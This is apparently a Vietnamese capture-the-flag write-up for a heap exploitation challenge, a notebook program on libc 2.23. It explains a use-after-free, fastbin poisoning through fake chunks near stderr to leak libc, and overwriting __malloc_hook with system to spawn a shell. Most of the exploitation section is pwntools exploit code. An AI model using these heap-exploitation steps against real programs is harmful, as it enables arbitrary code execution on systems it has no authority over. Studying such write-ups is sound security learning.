**1. Ý tưởng**
  - ![image](https://user-images.githubusercontent.com/113702087/218445230-1ad72c5c-8238-4fcd-bfa0-0a946aa0dbb4.png)
  - Chương trình tạo một note book bao gồm các tính năng buy, write, erase, read, và được thực hiện trên heap.
  - Sau khi free vẫn có thể sử dụng write nhờ đó ta có thể UAF.
  - Với libc-2.23 thì không có tcache do đó khi free chunk được đưa vào fastbin. 
  - Khi malloc 1 chunk ở fastbin ta cần lưu ý rằng size của chunk đó là hợp lệ và khi free 1 chunk thì chunk được free nextsize phải khác 0 và chunk & 0xf != 0.
  - Ta sẽ ghi đè malloc_hook thành system và thực thi /bin/sh, trước malloc_hook có 1 chunk hợp lệ để malloc là 0x7ffff7dd1afd có size thuộc chunk 0x70:
  - ![image](https://user-images.githubusercontent.com/113702087/218729175-6b550920-bbdd-4d35-a44e-9d9d2626cc6d.png)
  - Vì chỉ có được 1 chunk do đó không thể đưa vào unsorted bin và full relro nên không thể leak libc bằng nhưng cách này. Tuy nhiên trên binary có stderr thuộc phân vùng ghi được cũng như chứa libc, ta có thể cấp phát vào nó để leak libc.
  - Để malloc được địa chỉ đó phải có size, thật may ta có địa chỉ 0x40403d phù hợp với điều này
  - ![image](https://user-images.githubusercontent.com/113702087/218492785-733857f6-1078-49a9-9415-61b616665249.png)
  - Tuy nhiên sau khi đưa 0x40403d, vì có dữu liệu bên trong nên đã có 1 chunk ảo sinh ra do đó không thể malloc với size 0x70. Vậy nên ta sẽ tạo 1 chunk fake với size 0x70 rồi free nó như vậy mới có thể malloc vào 0x7ffff7dd1afd và thay đổi được malloc_hook. Fake chunk được chọn là 0x404050 ta sẽ cần thay đổi 0x404048 = 0x71 và nextsize của nó là 0x4040b8 != 0 ở đây tôi chọn 0x101

**2. Khai thác**
  - sử dụng uaf để malloc vào 0x40403d và thực hiện leak libc
  ```
  size = 0x70 - 8
  book(1, size)
  choice(3)
  book(2, size, p64(exe.sym['stderr']-19))

  book(1, size)
  book(1, size, b'abc')
  choice(4)
  r.recvuntil(b'abc')
  libc_leak = r.recv(6)
  libc.address = u64(libc_leak + b'\x00'*2) - libc.sym['_IO_2_1_stderr_']
  print(hex(libc.address))
  ```
  - ![image](https://user-images.githubusercontent.com/113702087/218730961-a4bca08a-4e9d-4bd8-a0e1-0f125048e70d.png)
  - ![image](https://user-images.githubusercontent.com/113702087/218731081-18749381-5775-426a-b537-d37bb508c61b.png)
  - setup 2 size cho 2 chunk 0x404045 với size là 0x31 và 0x4040a0 với size 0x41
  ```
  payload = b'\x31' + b'\x00'*18 + b'\x00'*8 + p64(exe.sym['stderr'])
  payload += (91 - len(payload))*b'a' + p64(0x41)
  book(2, size, payload)
  ```
  - ![image](https://user-images.githubusercontent.com/113702087/218732544-19bad976-0594-4452-b8a6-f96df01d5183.png)
  - ![image](https://user-images.githubusercontent.com/113702087/218732569-0c115792-bad1-44b6-94e2-096c00bf981e.png)
  - chunk 0x404045 có mục đích là thay đổi giá trị ptr còn 0x4040a0 để thay đổi nextsize của fakechunk.
  - đưa 0x404045 vào fast bin, thay đổi nextsize(fakechunk) và tạo chuỗi /bin/sh 
  ```
  book(1, 32)
  choice(3)
  book(2, size, p64(exe.sym['stdin']+5))
  book(1, 32)

  book(1, 48)
  choice(3)
  book(2, size, p64(0x4040a0-0x10))
  book(1, 48)
  book(1, 48, b'/bin/sh\x00'+ b'\x00'*0x10+p64(0x101))
  ```
  - ![image](https://user-images.githubusercontent.com/113702087/218738397-d757dea8-c6b5-4d88-b3ac-2ca1b52809be.png)
  - thay đổi ptr thành fakechunk và giải phóng nó
  ```
  payload = b'\x00'*3 + p64(0x71) + b'\x00'*8 + p64(exe.sym['size'])
book(1, 32, payload)

choice(3)
  ```
  - ![image](https://user-images.githubusercontent.com/113702087/218739033-1b34b9bd-0ed3-438e-bb9f-bde964b9eee8.png)
  - ghi đè vào malloc_hook
  ```
  payload = p64(libc.sym['__malloc_hook']-35)
book(2, size, payload)
book(1, size)
book(1, size, b'\x00'*19 + p64(libc.sym['system']))
  ```
  - ![image](https://user-images.githubusercontent.com/113702087/218739274-c5f76f53-fc9c-484e-aecc-e3a4880fef7b.png)
  - get shell
  ```
  r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'Size: ', str(0x4040a0).encode('utf-8'))
  ```
  - ![image](https://user-images.githubusercontent.com/113702087/218739420-57207086-4739-47e1-adb0-4cd54abb560a.png)
